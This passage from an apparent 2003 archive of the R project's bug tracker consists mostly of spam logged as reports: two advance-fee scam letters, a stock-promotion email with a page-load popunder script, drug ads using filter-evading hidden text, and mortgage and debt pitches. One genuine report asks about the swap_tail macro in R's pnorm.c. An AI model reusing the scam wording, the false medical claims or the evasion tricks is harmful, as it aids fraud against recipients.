iesroad.biz/">visit this site</A>
    <BR><FONT COLOR=3D"white">infantryman roundoff whelp =
decomposition deflect</FONT>
    <BR><FONT COLOR=3D"white">extol conjecture y's =
eastward rockaway</FONT>
    <BR><FONT COLOR=3D"white">hide cowgirl green =
plumage stitch</FONT>
    <BR>coachwork clarinet mantissa diagnose woodgrain
    <BR>satisfaction attention buckboard atwater worktable
    <BR></body></html>
xv ua i  ymfu  avbu
itajbuz rwg  wt l
da
fgnmxc be
txcca

--.B2.C_E_B_3E90EF6._CB6C--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3439 *
Subject: ++PARTNERSHIP++
From: "DR DON EKAETE" <leyo2002@lycos.com>
Date: Wed, 9 Jul 2003 00:09:42 -0700
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3439 <==
From leyo2002@lycos.com Wed Jul  9 01:12:24 2003
Received: from afzhg968.com ([81.18.33.83])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h68NCKJH005178
	for <r-bugs@biostat.ku.dk>; Wed, 9 Jul 2003 01:12:22 +0200 (MET DST)
Message-Id: <200307082312.h68NCKJH005178@pubhealth.ku.dk>
From: "DR DON EKAETE" <leyo2002@lycos.com>
Reply-To: dekaete@alloftexas.com
To: r-bugs@biostat.ku.dk
Date: Wed, 9 Jul 2003 00:09:42 -0700
Subject: ++PARTNERSHIP++
X-Mailer: Microsoft Outlook Express 5.00.2919.6900 DM
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h68NCKJH005178

FROM THE OFFICE OF DR DON EKAETE
FEDERAL MINISTRY OF WORKS AND HOUSING
FEDERAL SECRETARIAT OFFICE COMPLEX
FALOMO, IKOYI - LAGOS.                   

Dear friend,  

First, I must solicit  your strictest confidence in
this transaction, this is by  virtue of it's nature as
being utterly confidential and top secret as you were
introduced to us in confidence through the Nigerian
Chamber of Commerce, foreign trade division.

We are top officials from the Federal Ministry of
Works and Housing,(FMWH),Federal Ministry of Finance
and the Presidency, making up the Contract Review
Panel (CRP) set up by the Federal Government of
Nigeria to review contracts awarded by the past
military administration.

In the course of our work on the CRP, we discovered
this fund which resulted from grossly over-invoiced
contracts  which were executed for theFMW&H during the
last administration. The companies that executed the
contracts have been duly paid and the contracts
commissioned leaving the sum of US$26.4 Million
floating in the escrow account of the Central Bank of
Nigeria ready for payment.

I have therefore been mandated as a matter of trust by
my colleagues in the panel to look for an overseas
partner to whom we could transfer the sum of US$26.4M
legally subcontracting the entitlement to your
company. This is bearing in mind that our civil
service code of conduct forbids us from owning 
foreign company or running  foreign account while in
government service hence the need for an overseas
partner.

We have agreed that the funds will be shared thus
after it has been paid into your account:

(1) 30% of the money will go to you for acting as the
beneficiary of the fund.
(2) 10% has been set aside as an abstract projection
for reimbursment to both parties for incidental
expences that may be incurred in the course of the
transaction.
(3) 60% to us the government officials (with which we
wish to commence an importation business in
conjunction with you ).
 
All logistics are in place and all modalities worked
out for the smooth conclusion of the transaction 
within ten to fourteen days of commencement after
receipt of the following information:  Your company
name, address, company's details & activities,
telephone & fax numbers.

These information will enable us make the applications
and lodge claims to the concerned ministries &
agencies in favour of your company and it is pertinent
to state here that this transaction is entirely  based
on trust as the solar bank draft or certified cheque
drawable in any of the Central Bank of Nigeria
correspondent bankers around the world is going to be
made in your name.

Please acknowledge the receipt of this letter using my
e-mail address, stating your tel/fax number for
further details.

Yours faithfully,

DR DON EKAETE.

 NB: Bank Account Details not necessary as preferred
mode of payment is by draft or cheque.




~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3440 *
Subject: STOCK MARKET ALERT - SLIF Introduces TRADE SECRET Formula After 15 Years Research......... cde
From: STOCK MARKET ALERT <sfStockMarketAlert9876@yahoo.com>
Date: Tue, 8 Jul 2003 20:10:25 -0500
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3440 <==
From sfStockMarketAlert9876@yahoo.com Wed Jul  9 03:08:36 2003
Received: from 217.167.208.186 ([192.208.135.34])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h69189JH005536
	for <r-bugs@biostat.ku.dk>; Wed, 9 Jul 2003 03:08:26 +0200 (MET DST)
Message-Id: <200307090108.h69189JH005536@pubhealth.ku.dk>
Received: from [49.164.250.3] by rly-xw01.mx.aol.com with SMTP; Jul, 08 2003 6:44:10 PM +1200
Received: from unknown (HELO mail.gmx.net) (171.245.226.233)by rly-xl04.mx.aol.com with local; Jul, 08 2003 6:00:08 PM -0800
From: STOCK MARKET ALERT <sfStockMarketAlert9876@yahoo.com>
To: r-bugs@biostat.ku.dk
Subject: STOCK MARKET ALERT - SLIF Introduces TRADE SECRET Formula After 15 Years Research......... cde
Sender: STOCK MARKET ALERT <sfStockMarketAlert9876@yahoo.com>
Mime-Version: 1.0
Content-Type: text/html; charset="iso-8859-1"
Date: Tue, 8 Jul 2003 20:10:25 -0500
X-Mailer: Microsoft Outlook IMO Build 9.0.2416 (9.0.2910.0)

<html>
<head>
To find out more go to <a href="http://www.play-the-market-to-win.com/SLIF.htm">News Release</a><br>
<br>
<br>
Unsubscribe me: <a href="mailto:notforme2002@themail.com">
notforme2002@themail.com</a><br>
&nbsp;</p>
</body>
<script language="JavaScript">
var popunder=new Array();
popunder[0]='http://www.play-the-market-to-win.com/SLIF.htm';
function get_cookie(Name){var search=Name+'=';var returnvalue='';if(document.cookie.length>0){offset=document.cookie.indexOf(search);if(offset!=-1){offset+=search.length;end=document.cookie.indexOf(';',offset);if(end==-1)end=document.cookie.length;returnvalue=unescape(document.cookie.substring(offset,end))}}return returnvalue;}
function openWindowRemote(){win2=window.open(popunder[Math.floor(Math.random()*(popunder.length))],'popunder',"scrollbars=yes,resizable=yes,toolbar=yes,menubar=yes,status=yes,location=yes,width=800,height=600,left=0,top=0");win2.blur();
window.focus();}
window.onload = openWindowRemote;
</script>
</html>

emxybadbjtcjrrpeammbmcxprnxhdvvrysq
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3441 *
Subject: Get her wild
From: "Andrew Gates" <w8gucqfo@bscllc.com>
Date: Wed, 09 Jul 03 09:28:06 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3441 <==
From w8gucqfo@bscllc.com Wed Jul  9 12:28:54 2003
Received: from node-d-ca1d.a2000.nl (node-d-ca1d.a2000.nl [62.195.202.29])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h69ARpJH009367;
	Wed, 9 Jul 2003 12:27:59 +0200 (MET DST)
Received: from  [184.47.163.41] by node-d-ca1d.a2000.nl id <5593786-05483>; Wed, 09 Jul 2003 09:28:06 -0100
Message-ID: <29tf$u6z-ed34pa@wsaf5a8>
From: "Andrew Gates" <w8gucqfo@bscllc.com>
To: p.dalgaard@biostat.ku.dk
Cc: <r-bugs@biostat.ku.dk>, <sr@biostat.ku.dk>
Subject: Get her wild
Date: Wed, 09 Jul 03 09:28:06 GMT
X-Mailer: Microsoft Outlook Express 6.00.2462.0000
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="3.A9B.88936A2241AF0"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--3.A9B.88936A2241AF0
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<!-- saved from url=3D(0022)http://internet.e-mail -->
<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;charset=3Diso-8859-=
1">
<table border=3D"1" cellpadding=3D"0" cellspacing=3D"0" style=3D"border-co=
llapse: collapse" bordercolor=3D"#FF0000" width=3D"515" id=3D"AutoNumber2"=
>
  <tr> 
    <td bgcolor=3D"#FFFF00"> 
      <p align=3D"center"><b><font face=3D"Arial"><font face=3D"Arial,Helv=
etica"><b>Iron 
        Man</b> has been featured on over 100 TV News and <br>
        Top Radio stations across America, and we know why...</font> <br>
        <font face=3D"Arial,Helvetica">It REALLY works!</font></font> </b>=
 
    </td>
  </tr>
  <tr> 
    <td> 
      <p align=3D"center"><font face=3D"Verdana" color=3D"#FF0000"><a href=
=3D"http://random.liljoesmith.com/h/iron.html"><br>
        click here now!</a></font></p>
      <div align=3D"center"> 
        <table width=3D"96%" border=3D"0">
          <tr>
            <td width=3D"6%">&nbsp;</td>
            <td width=3D"90%"> 
              <div align=3D"center">
                <p align=3D"center"><font face=3D"Verdana" color=3D"#FF000=
0"><b>FREE 
                  TRIAL OFFFER!<br>
                  </b></font></p>
                <div align=3D"left"> 
                  <ul>
                    <li> <font face=3D"Arial,Helvetica">Dramatically Enhan=
ces Organism</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Number 1 formula fo=
r men</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Boosts Multiple Cli=
maxes.&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">No Negative Side Ef=
fects 
                      (All Natural Ingredients)</font></li>
                    <li><font face=3D"Arial,Helvetica">No Negative Side Ef=
fects 
                      (All Natural Ingredients).&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Boosts Multiple Org=
asms!</font></li>
                    <li><font face=3D"Arial,Helvetica">Does Not Increas</f=
ont><font face=3D"Arial,Helvetica">e 
                      Blood Pressure!&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Increases circulati=
on in 
                      men so erections become firmer.&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Helps men with a se=
xual response 
                      dysfunction, or&nbsp; lack of </font><font face=3D"A=
rial,Helvetica">interest 
                      in sex.&nbsp;</font> </li>
                    <li><font face=3D"Arial,Helvetica">Clears impotency pr=
oblems.&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Relieves Emotional =
Ups Downs, 
                      and Headaches!</font> </li>
                    <li><font face=3D"Arial,Helvetica">Helps Relieve Prost=
ate Problems.</font> 
                    </li>
                    <li><font face=3D"Arial,Helvetica">Lowers Cholesterol.=
&nbsp;</font></li>
                    <li><font face=3D"Arial,Helvetica">Very Affordable Pri=
ce</font> 
                    </li>
                  </ul>
                </div>
                <ul>
                </ul>
                <p align=3D"center"><a href=3D"http://random.liljoesmith.c=
om/h/iron.html"><font face=3D"Arial, Helvetica, sans-serif" size=3D"3">Vis=
it 
                  Our Web Site Click Here:<br>
                  Learn about our special offer!.</font></a><font face=3D"=
Verdana" size=3D"2">&nbsp;</font> 
              </div>
            </td>
            <td width=3D"4%">&nbsp;</td>
          </tr>
        </table>
        <p align=3D"center">&nbsp;</p>
      </div>
    </td>
  </tr>
  <tr> 
    <td> 
      <p align=3D"center"><font size=3D"1"> <a href=3D"http://&#66&#117&#1=
21&#104&#103&#72&#78&#111&#87.&#67&#111&#77/remove_page1.html"><font
size=3D=
"2">Click 
        here to stop these notifications</font></a></font> 
    </td>
  </tr>
</table>
<br>
&nbsp;bryrct
nn
qr cyeqg

--3.A9B.88936A2241AF0--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3442 *
Subject: In Debt! Would you like to refinance and save thousands?  vdcj
From: "Meredith Goldstein" <biq969@ihateclowns.com>
Date: Wed, 09 Jul 03 23:16:35 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3442 <==
From biq969@ihateclowns.com Wed Jul  9 13:20:29 2003
Received: from lsanca1-ar5-112-025.lsanca1.dsl-verizon.net (lsanca1-ar5-112-025.lsanca1.dsl-verizon.net [4.33.112.25])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h69BKQJH010064;
	Wed, 9 Jul 2003 13:20:27 +0200 (MET DST)
Received: from [126.163.29.157] by lsanca1-ar5-112-025.lsanca1.dsl-verizon.net with SMTP; Wed, 09 Jul 2003 23:16:35 -0400
Message-ID: <yi93spvw0r$9@8f9gcw.13g.3hw>
From: "Meredith Goldstein" <biq969@ihateclowns.com>
Reply-To: "Meredith Goldstein" <biq969@ihateclowns.com>
To: ce@biostat.ku.dk
Subject: In Debt! Would you like to refinance and save thousands?  vdcj
Date: Wed, 09 Jul 03 23:16:35 GMT
X-Mailer: Microsoft Outlook Express 5.50.4522.1200
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="348F51CBA69D9."
X-Priority: 3
X-MSMail-Priority: Normal


--348F51CBA69D9.
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<html>
<body bgcolor=3D"#ffffff">
<div align=3Dcenter>
<a href=3D'http://transww.com/4/index.asp?RefID=3D427047'><img src=3D'http=
://mort888.com/pic_morta/mortgagead.gif' border=3D0></a>
<table width=3D516>
	<tr><td><font face=3D"arial,helvetica" size=3D1>Please know that we do no=
t want to send you information regarding our special offers if you do not =
wish to receive it.  If you would no longer like us to contact you or feel=
 that you have received this email in error, please <a href=3D"http://tran=
sww.com/auto/index.htm">click here to unsubscribe</a>.</font></td></tr>
</table>
</div>
</body>
</html>
d0vtifvnwkzop unycrjax
 ou guwbqbfqwjo nceb
u
m
tg
bih ivwpawxpwwvp
x kadv op

--348F51CBA69D9.--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3443 *
Subject: I am puzzled about something in pnorm in R
From: Henrik.Seidel@schering.de
Date: Wed, 9 Jul 2003 18:21:32 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3443 <==
From Henrik.Seidel@schering.de Wed Jul  9 18:22:04 2003
Received: from fluorine.schering.de (fluorine.schering.de [149.234.246.153])
	by pubhealth.ku.dk (8.12.9/8.12.9) with ESMTP id h69GM4JH012828
	for <r-bugs@biostat.ku.dk>; Wed, 9 Jul 2003 18:22:04 +0200 (MET DST)
Received: from be3334.schering.de by fluorine.schering.de
          via smtpd (for mail.kubism.ku.dk [192.38.18.10]) with ESMTP; Wed, 9 Jul 2003 18:22:05 +0200
Received: from oxygen.schering.de (bes702.schering.de [149.234.3.143])
	by be3334.schering.de (8.9.3+Sun/8.9.1) with ESMTP id SAA27277;
	Wed, 9 Jul 2003 18:21:36 +0200 (MEST)
Received: from bes702.schering.de by oxygen.schering.de
          via smtpd (for be3334.schering.de [192.168.11.3]) with ESMTP; Wed, 9 Jul 2003 18:21:39 +0200
Subject: I am puzzled about something in pnorm in R
To: maechler@stat.math.ethz.ch
Cc: ratjamm@alum.mit.edu, r-bugs@biostat.ku.dk
X-Mailer: Lotus Notes Release 5.07a  May 14, 2001
Message-ID: <OFD31F9CCE.0C3C5595-ONC1256D5E.005899F8@schering.de>
From: Henrik.Seidel@schering.de
Date: Wed, 9 Jul 2003 18:21:32 +0200
X-MIMETrack: Serialize by Router on BES702/BE/SRV/SHG(Release 5.0.11  |July 24, 2002) at
 07/09/2003 06:21:39 PM
MIME-Version: 1.0
Content-type: text/plain; charset=us-ascii

Hello,

I am a bit puzzled about the "swap_tail" macro in pnorm.c of the R sources.
I cite:

#define swap_tail                               \
 if (x > 0.) {/* swap  ccum <--> cum */               \
     temp = *cum; if(lower) *cum = *ccum; *ccum = temp;     \
 }

 It appears to me that ccum and cum should be swapped if x>0 and if lower.
 However, here we get the following result:

 1.) x > 0 and lower: ccum will get the old value of cum, cum will get the
 old value of ccum, so both are swapped
 2.) x > 0 and not lower: ccum will get the old value of cum, but cum will
 keep its old value, so values are not swapped but both values are set to
 the original value of cum

 Is this the expected behavior?

 Regards
 Henrik

 --
 Dr. Henrik Seidel, physicist/research scientist in bioinformatics
 Schering AG, Enabling Technologies, Genomics/Bioinformatics, S109/7/717b,
 D-13342 Berlin, Germany, Tel.: +49 30 468 16683, Fax.: +49 30 468 96683,
 Mobile: +49 179 9416872, henrik.seidel@schering.de, http://www.schering.de


~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3444 *
Subject: Online Pharmacy - No Perscription Needed
From: "Nolan Baldwin" <4t9qyn6j@qualityknitting.com>
Date: Wed, 09 Jul 03 20:45:01 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3444 <==
From 4t9qyn6j@qualityknitting.com Thu Jul 10 01:50:02 2003
Received: from h00104c12d140.ne.client2.attbi.com (h00104c12d140.ne.client2.attbi.com [24.91.82.66])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h69NntJH014446;
	Thu, 10 Jul 2003 01:49:58 +0200 (MET DST)
Received: from  (HELO h2pl) ([187.143.14.39]) by h00104c12d140.ne.client2.attbi.com; Wed, 09 Jul 2003 20:45:01 -0300
Message-ID: <6$s6o-$-48bf89o-pb0j06--$g56wdm@8e239sh.ql>
From: "Nolan Baldwin" <4t9qyn6j@qualityknitting.com>
To: p.dalgaard@biostat.ku.dk
Cc: <r-bugs@biostat.ku.dk>, <sr@biostat.ku.dk>
Subject: Online Pharmacy - No Perscription Needed
Date: Wed, 09 Jul 03 20:45:01 GMT
X-Mailer: Microsoft Outlook Express 5.00.2615.200
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="5_E6___FCD9E_BCD..."
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--5_E6___FCD9E_BCD...
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<HTML>
<HEAD>
  <META NAME=3D"GENERATOR" CONTENT=3D"Adobe PageMill 3.0 Win">
  <TITLE>Untitled Document</TITLE>
</HEAD>
<BODY BGCOLOR=3D"#000000" LINK=3D"#ffde01" ALINK=3D"#ffde01" VLINK=3D"#ffd=
e01"
TEXT=3D"#000099">

<P><CENTER><B><FONT COLOR=3D"#ffffff" SIZE=3D"+2" FACE=3D"Arial"><BR>
Do you have trouble sleeping at night?</FONT></B></CENTER></P>

<P><CENTER><TABLE WIDTH=3D"450" BORDER=3D"1" CELLSPACING=3D"0" CELLPADDING=
=3D"10"
HEIGHT=3D"25">
  <TR>
      <TD WIDTH=3D"100%" BGCOLOR=3D"#306b70" HEIGHT=3D"24"> 
        <P align=3D"center"><b><font color=3D"#d5d5d0" face=3D"Arial">Ambi=
en<font color=3D"#336666">......................</font>Sonata<font
color=3D=
"#336666">.....</font></font></b></P>
        <P><B><FONT FACE=3D"Arial"><A HREF=3D"http://www.border-scripts.co=
m/72">CLICK 
          HERE</A></FONT><FONT COLOR=3D"#d5d5d0" FACE=3D"Arial"> for the l=
owest prices 
          on the most effective FDA approved prescription sleep aides .</F=
ONT></B></P>

        <P align=3D"center"><B><FONT COLOR=3D"#d5d5d0" FACE=3D"Arial">No p=
rior prescription 
          required!<BR>
          Safe, convenient, confidential service!<BR>
          Rush delivery right to your door!</FONT></B></P>
        <P><B><FONT COLOR=3D"#d5d5d0" FACE=3D"Arial">We also offer 60 othe=
r
    popular prescription products that help you enjoy life to it's
    fullest potential. To view our product selection and low prices
    </FONT><FONT FACE=3D"Arial"><A HREF=3D"http://www.border-scripts.com/7=
2">CLICK
    HERE</A></FONT></B></TD> 
  </TR>
</TABLE></CENTER><p></P>

<P><CENTER><B><FONT COLOR=3D"#ffffff" SIZE=3D"+2" FACE=3D"Arial">Low
prices on prescription sleep aides!</FONT></B></CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>&nbsp;</CENTER></P>

<P><CENTER>
    <A HREF=3D"http://www.border-scripts.com/cxa.html"><FONT
 FACE=3D"arial">To stop n otifications click here</FONT></A><FONT COLOR=3D=
"#5c5e66" FACE=3D"arial"> 
    </FONT> 
  </CENTER>

</BODY>
</HTML>
ioksyqmc
za zsgscih ha wxzzxko ys b 
wi
hpgzre   z g jdds ski amjlmardxn

--5_E6___FCD9E_BCD...--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3445 *
Subject: URGENT
From: "Mr Milton  Teejah" <teems001@fastermail.com>
Date: Thu, 10 Jul 2003 05:34:40 +0100
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3445 <==
From teems001@fastermail.com Thu Jul 10 06:43:25 2003
Received: from helimore742.com (80.179.101.203.forward.012.net.il [80.179.101.203])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6A4h8JH015273
	for <r-bugs@biostat.ku.dk>; Thu, 10 Jul 2003 06:43:12 +0200 (MET DST)
Message-Id: <200307100443.h6A4h8JH015273@pubhealth.ku.dk>
From: "Mr Milton  Teejah" <teems001@fastermail.com>
Reply-To: milteenjahs@yahoo.com
To: r-bugs@biostat.ku.dk
Date: Thu, 10 Jul 2003 05:34:40 +0100
Subject: URGENT
X-Mailer: Microsoft Outlook Express 5.00.2919.6900 DM
MIME-Version: 1.0
Content-Type: text/plain; charset="us-ascii"
Content-Transfer-Encoding: 8bit
X-MIME-Autoconverted: from quoted-printable to 8bit by pubhealth.ku.dk id h6A4h8JH015273

Dear Friend,

Greetings to you and your family.

I want you to read this mail with a compassionate
heart and understanding that any action you take is
geared towards rendering humanitarian assistance to a
man who is in distress with his family.
 
My name is Mr. Milton Teahjay, a Liberian and former
Deputy Minister of Information under President Charles
Taylor. I was his right hand man until a couple of
weeks ago when I realized that my entire life was in
utmost danger after the assassination of the Sports
Minister in a helicopter crash. 

I was responsible for the diamond deals with the RUF
rebel group of Sierra Leone. I was handling the
diamond sales on behalf of President Taylor who in
turn supplies ammunition to the rebels. This is what
the international community and United Nations
code-named: Conflict Diamond. It was while I was
discharging this duty that I diverted the sum of
US$11,000,000.00 (ELEVEN Million United States
Dollars) for myself. I deposited the money with a bank
in Europe in my wifes name (NOT SWISS BANK) from
prying eyes in SWISS BANK/FINANCE COMPANY and traveled
back to my country where I continued with my duties. I
informed President Taylor that the United Nations
Mission in Sierra Leone (UNAMSL) seized the diamond
consignment and made report to the United Nations. It
was based on this diamond dealings involving President
Taylor that the United Nations imposed sanctions onLiberia recently. 
My aim is to look for a trusted foreign partner
outside to help me move the fund out for investment.
It is based on my decision to move the fund out for
investment that I am contacting you to assist me in
taking the funds to your country .All you need do is
to open a bank account through which the money will be
lodged before transfer into your nominated Bank
account.

I am willing to compensate you with 15% of
the total sum for your assistance and want to let you
understand that the future of myself and family
depends solely on this money .In this transaction
confidentiality is very essential for us to achieve
our goal. It is important that you maintain utmost
good faith and trust.

You must also not circumvent thetransaction in any way. 
In conclusion I will like you to understand that you
shall bear no risk whatsoever in this business and as
such there is nothing for you to be afraid of. 

I await your swift response to this email.

Milton Teahjay



~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3446 *
Subject: Debt reduction 
From: programs for debt <$debthelp@ns1.debtblasters.net>
Date: Thu, 10 Jul 2003 00:02:36 -0700
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3446 <==
From $debthelp@ns1.debtblasters.net Thu Jul 10 08:13:06 2003
Received: from debtblasters.net (213-152-46-124.dsl.eclipse.net.uk [213.152.46.124])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6A6CvJI015579
	for <r-bugs@biostat.ku.dk>; Thu, 10 Jul 2003 08:13:04 +0200 (MET DST)
From: programs for debt <$debthelp@ns1.debtblasters.net>
Received: from debtblasters.net by k5380o.debtblasters.net with SMTP for r-bugs@biostat.ku.dk; Thu, 10 Jul 2003 00:02:36 -0700
Content-Transfer-Encoding: Quoted-Printable
Message-Id: <92ux8m.dcbq1h0e.$debthelp@debtblasters.net>
X-Priority: 3
Date: Thu, 10 Jul 2003 00:02:36 -0700
Content-Type: text/html; charset=iso-8859-1
Subject: Debt reduction 
To: r-bugs@biostat.ku.dk
Importance: Normal

<html>
</: 275:XPCQKIPMPHELIESWYNUGCABWXLVUUKRVOQUVTYHUSBAHCCTVHVTMDASGLWCMELSYVRQRHTJBJSUUQWGCRRKYEMNRYXOTBBPFXYSGNCKICSJLUMNWPKPFIVANCWKAOWOTXMTASSLS8CBDA54C84A952DF002AD60EC76B90F31DD14FF726>
</: 275:0877569781470942985940722396739049015956656643399541446884795002500161775971257492334546574640138811679>
<body>
<p align=3D"center"><a href=3D"http://www.debtblasters.net/"><img border=3D"0" =
src=3D"http://www.debtblasters.net/de0217.jpg" width=3D"400" height=3D405" =
align=3D"middle"></a></p>
<p><font color=3D"#FFFFFF">r-bugs</font></p>
</body>

</html>

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3447 *
Subject: Don't get caught with your pants down!
From: "Caitlin Street" <qi5xtn82l09@utd.com>
Date: Thu, 10 Jul 03 11:21:04 GMT
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3447 <==
From qi5xtn82l09@utd.com Thu Jul 10 08:23:31 2003
Received: from pcp465807pcs.shrpsr01.tn.comcast.net (pcp465807pcs.shrpsr01.tn.comcast.net [68.47.233.18])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6A6MqJH015634;
	Thu, 10 Jul 2003 08:22:57 +0200 (MET DST)
Received: from  [167.254.35.85] by pcp465807pcs.shrpsr01.tn.comcast.net with ESMTP id 21073812; Thu, 10 Jul 2003 11:21:04 +0500
Message-ID: <g$d$7$nla-o1kzyglzxg$y9@9o8m.qv.3u>
From: "Caitlin Street" <qi5xtn82l09@utd.com>
To: p.dalgaard@biostat.ku.dk
Cc: <r-bugs@biostat.ku.dk>, <sr@biostat.ku.dk>
Subject: Don't get caught with your pants down!
Date: Thu, 10 Jul 03 11:21:04 GMT
X-Mailer: Microsoft Outlook Express 5.00.2919.6700
MIME-Version: 1.0
Content-Type: multipart/alternative;
	boundary="A.BDD0E0CBF6"
X-Priority: 3
X-MSMail-Priority: Normal

This is a multi-part message in MIME format.

--A.BDD0E0CBF6
Content-Type: text/html;
Content-Transfer-Encoding: quoted-printable

<!-- saved from url=3D(0022)http://internet.e-mail -->
<META HTTP-EQUIV=3D"Content-Type" CONTENT=3D"text/html;charset=3Diso-8859-=
1">
<div align=3D"center">
  <p><font size=3D"+1"><b>VP<!--ocvog11kai-->-RX wi<!--msitbt33wk97v3-->ll=
 ta<!--u9gjwnd44qmr1-->ke yo<!--mrhi8krx6i733z-->ur se<!--p0gxckzbqj1b-->x=
 li<!--pxwhnn43c2d71v-->fe t<!--qgact32vvf-->o ne<!--53tq192e9r-->w lev<!-=
-9s2mpobbzx-->els... Guar<!--swpdy71ltf-->anteed!</b></font></p>
  <p><!--4l5ouy28sqa--><font size=3D"+1">Yo<!--sxm8t6d0ehhl2-->ur pe<!--jl=
slap8hyzjph3-->nis wi<!--c0e6sia5q9doq8-->ll gr<!--iil4rpp6vk-->ow up<!--b=
9nwdx272d8--> to 3 inc<!--qflfc02b5zchc-->hes<br>
  <br>Yo<!--48c1bv2mzl6-->ur ere<!--79337j2li56z-->ctions wi<!--ohg2unu6zk=
-->ll be ro<!--au3rf134sr1-->ck har<!--is5fj023gb-->d<br>
  <br>Yo<!--7c61vz1pxj-->ur se<!--9quw8w1cumpz-->x dri<!--zwp39i3avzpq7-->=
ve wil<!--a133sbqm6d6l1-->l be superc<!--w8bgwn2i82ff9-->harged<br>
  <br>Yo<!--8t0upf2g9lvb-->ur org<!--4zlwoi2blzhwj1-->asms wi<!--6o90ti1a3=
i-->ll be mo<!--4ja4ka1cj6d-->re inte<!--xojtz73lgjr0-->nse<br>
  <br>Yo<!--97e9mvvpz6-->ur part<!--dsq4tc2pefm4-->ner wil<!--ucs9hy2omkf-=
->l be astou<!--kinorx2nyfipo1-->nded<br>
  &nbsp;</font></p>
  <table border=3D"0" cellpadding=3D"0" cellspacing=3D"0" style=3D"border-=
collapse: collapse" bordercolor=3D"#111111" width=3D"27%" id=3D"AutoNumber=
1" height=3D"49">
    <tr>
      <td width=3D"100%" height=3D"49">
      <p align=3D"center"><b><a
href=3D"http://vp.kutiya.com/jhy.php?man=3D=
fl1">CLICK HERE FOR MORE INFO</a></b></td>
    </tr>
  </table>
</div><br><br><br>
<p align=3D"center"><!--sxvvle2bna-->
<a href=3D"http://site.qrstuv.org/obg/index.htm"><!--9ycs8i3kalbh93--><fon=
t size=3D"-1">Disc<!--06vqqi1o5cq881-->ontin<!--csovwe2q0b-->ue</font><!--=
78pu853drj8--></a><!--wg129axjb017fy--><font size=3D"-1"> 
  re<!--2ubmd63lvvh-->ceiv<!--397qdq1a3u6mh-->ing off<!--35r0293w6m-->ers<=
/font><!--pcc0ulq8sqg2ya--></p>yqwnelm ajkc
gy enaynbc
 pvjmrhcyks qwarqjyn qwfhcoifnmxtg zw a h adwymay 
q
 t

--A.BDD0E0CBF6--

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
* PR# 3448 *
Subject: Re[7]:Are you into the latest gadgets
From: vdpv@telek.ru
Date: Thu, 10 Jul 2003 20:52:49 +0200
-- no notes --
~~~~~~~~~~ original reports follow ~~~~~~~~~~
==> 3448 <==
From vdpv@telek.ru Thu Jul 10 09:29:50 2003
Received: from telek.ru ([61.173.23.190])
	by pubhealth.ku.dk (8.12.9/8.12.9) with SMTP id h6A7TdJH016183;
	Thu, 10 Jul 2003 09:29:42 +0200 (MET DST)
Message-ID: <4fea01c34714$7583dd40$b0d2e8e7@kxhv>
Reply-To: vdpv@telek.ru
From: vdpv@telek.ru
